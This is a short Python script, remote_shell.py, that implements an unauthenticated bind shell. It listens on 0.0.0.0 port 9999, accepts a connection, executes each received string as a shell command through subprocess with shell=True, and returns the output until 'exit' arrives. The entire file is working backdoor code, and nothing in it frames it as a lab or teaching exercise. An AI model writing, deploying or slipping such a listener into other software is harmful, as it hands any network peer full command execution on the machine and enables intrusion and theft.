# remote_shell.py
import socket
import subprocess
import os

def remote_shell():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))  # Bind to local IP and port 9999
    server.listen(5)
    print("[*] Listening on 0.0.0.0:9999")

    client_socket, addr = server.accept()
    print(f"[*] Connection established with {addr}")

    while True:
        command = client_socket.recv(1024).decode("utf-8")
        if command.lower() == "exit":
            client_socket.send(b"Connection closed")
            break

        output = subprocess.run(command, shell=True, capture_output=True)
        client_socket.send(output.stdout + output.stderr)

    client_socket.close()

if __name__ == "__main__":
    remote_shell()
